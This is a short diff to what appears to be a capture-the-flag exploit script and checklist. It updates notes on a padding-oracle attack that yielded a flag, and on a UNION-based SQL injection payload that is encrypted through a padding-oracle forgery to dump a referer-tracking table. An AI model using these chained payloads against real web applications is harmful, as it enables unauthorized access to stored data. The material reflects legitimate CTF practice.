@@ -9,7 +9,7 @@
     
     o Open to check
         [x] Create links on one instance and test on new instances => nothing found, but 404
-        [ ] tracking.gif (main and result page)
+        [x] tracking.gif (main and result page) => stores referer to table 'tracking'
         [/] Generate own links when encryption key available => Is already possible with encryption oracle
         [x] Padding oracle for encrypt JSON string => got flag 2
         [x] Padding oracle attack to get plain-text of entry with 'id'=1 using post-oracle => Only bit rubbish
@@ -270,7 +270,7 @@ def get_flag_3():
     #         => table 'tracking'
 
     plain_text_manipulated = '{"id":"1 AND false UNION SELECT group_concat(id,0x3a,headers),\'\' FROM tracking"}'
-    # Result: ????
+    # Result: Referer link that gives access to decoded post (id=1)
 
     cipher_text = padding_oracle_encrypt(plain_text_manipulated, plain_text_original, data_original, block_size=block_size, base_url=base_url, verbose=False)
     cipher_text_encoded = encode_data(cipher_text)
